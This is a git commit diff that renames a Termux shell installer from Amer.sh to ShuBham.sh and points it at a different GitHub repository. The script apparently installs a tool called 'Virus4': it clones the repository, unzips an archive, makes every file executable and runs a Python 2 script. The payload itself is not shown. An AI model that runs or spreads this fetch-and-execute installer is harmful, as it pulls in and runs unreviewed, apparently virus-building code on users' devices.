e4a854b1e6413708b3604d2b06ebb9b1ccf6c5ad
sHuBhAm_G0sAiN <63947251+ShuBhamg0sain@users.noreply.github.com>
2020-10-10 20:35:16 +0530

    Update and rename Amer.sh to ShuBham.sh

--- ShuBham.sh
+++ ShuBham.sh
@@ -70,19 +70,20 @@ if [ "$download" -eq "1"  ]; then
  mkdir /sdcard/Virus4
  mkdir /sdcard/Virus4/Encrypt
  cd
- git clone https://github.com/amerlaceset/Virus
+ git clone https://github.com/ShuBhamg0sain/ShuBham
  cd
- cd Virus
+ cd ShuBham
+ cd SG
  mv -v Virus4.zip $HOME
  cd
- rm -rf Virus
+ rm -rf ShuBham
  cd
  unzip Virus4.zip 
  cd Virus4 && chmod +x *
  cd $HOME/Virus4
  chmod +x *
  cd
- rm -rf Virus
+ rm -rf ShuBham
  rm -rf Virus4.zip
  cd
  cd $HOME/Virus4/.tools
@@ -101,7 +102,8 @@ elif [ "$download" -eq "2"  ]; then
  cd
  clear
  termux-setup-storage
- rm -rf $HOME/Virus
+ rm -rf $HOME/ShuBham
+ rm -rf $HOME/SG
  rm -rf $HOME/Virus4.zip
  rm -rf $HOME/Virus4
  clear
@@ -156,8 +158,9 @@ elif [ "$download" -eq "2"  ]; then
  echo -e "$g+++++++++++++++>$p[Please Wait]$g<++++++++++++++"
  sleep 0.4
  cd
- git clone https://github.com/amerlaceset/Virus4
- cd Virus4
+ git clone https://github.com/ShuBhamg0sain/ShuBham
+ cd ShuBham
+ cd sg
  chmod +x *
  clear
  echo -e "$g+++++++++++>[$pWelcome to the new update$p$g]<+++++++++++++"
@@ -167,5 +170,5 @@ elif [ "$download" -eq "2"  ]; then
  sleep 2
  python2 Virus4.py
 else :
- bash Amer.sh
+ bash ShuBham.sh
 fi
